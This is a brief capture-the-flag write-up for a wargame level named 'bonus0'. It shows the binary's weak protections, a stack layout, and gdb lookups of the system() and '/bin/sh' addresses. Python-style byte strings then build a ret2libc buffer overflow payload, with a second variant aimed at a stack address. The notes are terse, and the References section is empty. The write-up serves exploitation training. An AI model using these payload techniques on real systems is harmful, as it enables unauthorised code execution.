# bonus0

## Header

```bash
ssh bonus0@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

<hr>

## Solution

Memory scheme
```
<------------------------ Low addresses

pp-buf1, 20 bytes
pp-buf2, 20 bytes    
pp-ebp,  4 bytes
pp-ret,  4 bytes
pp-arg1, 4 bytes
buf42,   42 bytes
main-ebp
main-ret

<------------------------ High addresses
```

To overwrite: 20 from buf1 + 19 from buf2 = 39 bytes + 1 space = 40 bytes.
buf2 should start with 2 bytes of padding, then 4 bytes to overwrite ebp, 4 bytes for ret addr, another 4 bytes of skipping arg, then 4 bytes of /bin/sh


```gdb
(gdb) x/s 0xb7e6b060
0xb7e6b060 <system>:     
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"
```

b1 = "X" * 20
b2 = "X" * 6 + "\xb7\xe6\xb0\x60"[::-1] + "Y" * 4 + "\xb7\xf8\xcc\x58"[::-1] + "Z\x00"

b2 = "X" * 6 + "\xbf\xff\xff\x89"[::-1] + "Y" * 9 + "\x00"
0xbfffff89

## References
